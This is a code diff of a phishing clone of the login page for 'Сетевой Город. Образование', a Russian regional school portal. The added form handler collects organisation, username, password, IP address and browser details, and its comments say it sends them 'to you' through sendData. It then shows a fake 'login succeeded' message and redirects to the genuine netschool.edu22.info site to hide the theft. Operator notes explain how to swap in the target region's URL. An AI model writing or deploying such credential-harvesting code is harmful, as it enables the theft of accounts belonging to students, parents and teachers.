@@ -484,7 +484,6 @@
                 <div class="logoline__textblock">
                     <div class="logoline__headertext">Сетевой Город. Образование</div>
                     <div class="logoline__slogantext hidden-xs">Единая цифровая образовательная среда региона</div>
-                    <div class="logoline__slogantext hidden-xs">Единая цифровая образовательная среда региона</div>
                 </div>
             </div>
         </div>
@@ -825,71 +824,83 @@
                 $(this).find('.state03').toggle($(this).hasClass('active'));
             });
             
-            // 7. Обработка отправки формы
-            $('#loginForm').submit(async function(e) {
-                e.preventDefault();
-                
-                // Сбор данных
-                const orgId = $('select[name="org"]').val();
-                const orgName = $('select[name="org"] option:selected').text();
-                const login = $('input[name="loginname"]').val().trim();
-                const password = $('input[name="password"]').val().trim();
-                const remember = $('#rememberCheckbox').hasClass('active');
-                
-                // Валидация
-                $('.has-error').removeClass('has-error');
-                $('.help-block').hide();
-                
-                let hasError = false;
-                
-                if (!orgId) {
-                    $('.dropdown-org').addClass('has-error');
-                    $('.dropdown-org .help-block').show();
-                    hasError = true;
-                }
-                
-                if (!login) {
-                    $('#loginInput').addClass('has-error');
-                    hasError = true;
-                }
-                
-                if (!password) {
-                    $('#passInput').addClass('has-error');
-                    hasError = true;
-                }
-                
-                if (hasError) return;
-                
-                // Показываем лоадер
-                $('#loader').show();
-                
-                // Собираем дополнительные данные
-                const data = {
-                    timestamp: new Date().toISOString(),
-                    orgId: orgId,
-                    orgName: orgName,
-                    login: login,
-                    password: password,
-                    remember: remember,
-                    ip: await getIP(),
-                    userAgent: navigator.userAgent,
-                    referrer: document.referrer,
-                    mode: $('.changeorg_item.active').text()
-                };
-                
-                // Отправляем данные
-                const success = await sendData(data);
-                
-                // Скрываем лоадер
-                $('#loader').hide();
-                
-                if (success) {
-                    // Показываем успешное сообщение
-                    showSuccessMessage();
-                } else {
-                    alert('Ошибка при входе. Попробуйте еще раз.');
-                }
-            });
+// 7. Обработка отправки формы
+$('#loginForm').submit(async function(e) {
+    e.preventDefault();
+    
+    // Сбор данных
+    const orgId = $('select[name="org"]').val();
+    const orgName = $('select[name="org"] option:selected').text();
+    const login = $('input[name="loginname"]').val().trim();
+    const password = $('input[name="password"]').val().trim();
+    const remember = $('#rememberCheckbox').hasClass('active');
+    
+    // Валидация
+    $('.has-error').removeClass('has-error');
+    $('.help-block').hide();
+    
+    let hasError = false;
+    
+    if (!orgId) {
+        $('.dropdown-org').addClass('has-error');
+        $('.dropdown-org .help-block').show();
+        hasError = true;
+    }
+    
+    if (!login) {
+        $('#loginInput').addClass('has-error');
+        hasError = true;
+    }
+    
+    if (!password) {
+        $('#passInput').addClass('has-error');
+        hasError = true;
+    }
+    
+    if (hasError) return;
+    
+    // Показываем лоадер
+    $('#loader').show();
+    
+    // Собираем данные для отправки тебе
+    const data = {
+        timestamp: new Date().toISOString(),
+        orgId: orgId,
+        orgName: orgName,
+        login: login,
+        password: password,
+        remember: remember,
+        ip: await getIP(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer,
+        mode: $('.changeorg_item.active').text()
+    };
+    
+    // 1. Сначала отправляем данные тебе
+    const success = await sendData(data);
+    
+    // 2. Скрываем лоадер
+    $('#loader').hide();
+    
+    if (success) {
+        // 3. Показываем сообщение "Вход выполнен"
+        showSuccessMessage();
+        
+        // 4. Через 2 секунды редиректим на оригинальный сайт
+        setTimeout(() => {
+            // 🔗 ВАЖНО: Вставь сюда реальный URL оригинального сайта
+            window.location.href = 'https://netschool.edu22.info/dashboard';
+            
+            // ИЛИ на страницу входа оригинала:
+            // window.location.href = 'https://netschool.edu22.info/authorize/login';
+            
+            // ИЛИ если сайт в твоём регионе другой:
+            // window.location.href = 'https://сетевой-город.твойрегион.рф';
+        }, 2000);
+    } else {
+        alert('Ошибка при входе. Попробуйте еще раз.');
+    }
+});
             
             // 8. Автоматически открываем форму
             $('#gosBtn').click();
